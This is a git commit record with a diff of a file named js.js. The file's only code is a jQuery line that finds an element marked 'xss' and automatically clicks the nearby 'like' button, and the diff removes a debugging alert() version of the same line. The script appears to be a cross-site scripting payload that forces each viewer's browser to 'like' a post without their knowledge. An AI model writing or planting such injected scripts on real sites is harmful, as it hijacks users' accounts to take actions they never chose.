66bc71bc4101233ca62dc58efd9a6d123191507f
ComputerCandy <thomas.kool.12@gmail.com>
2017-02-10 20:14:06 +1300

    Update js.js

--- js.js
+++ js.js
@@ -1,2 +1,1 @@
 $(".xss").parent().parent().find('.footer').first().find('button.like.btn').first().click();
-alert($(".xss").parent().parent().find('.footer').first().find('button.like.btn').first().click().html());
